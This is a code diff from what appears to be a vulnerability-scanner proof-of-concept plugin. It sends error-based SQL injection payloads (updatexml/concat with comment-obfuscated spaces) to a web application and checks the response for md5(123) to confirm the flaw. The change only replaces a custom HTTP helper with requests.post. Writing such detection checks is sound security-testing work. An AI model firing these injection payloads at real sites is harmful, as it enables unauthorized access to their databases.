@@ -39,8 +39,9 @@ class Poc(ABPoc):
                 post_datas = ("deid[0]=1/**/or/**/1=updatexml(1,concat(0x5c,(select/**/md5(123)/**/limit/**/1)),1)&recover=1#",
                       "act=add&chk[]=1/**/or/**/1=updatexml(1,concat(0x23,(select/**/md5(123)/**/limit/**/1)),1)#")
                 for post_data in post_datas:
-                    code, head, body, errcode, _url = hh.http(' "%s" -d "%s" ' % (url, post_data))
-                    if code == 200 and '202cb962ac59075b964b07152d234b7' in body:
+                    req = requests.post(url, data=post_data)
+
+                    if req.status_code == 200 and '202cb962ac59075b964b07152d234b7' in req.text:
                         self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
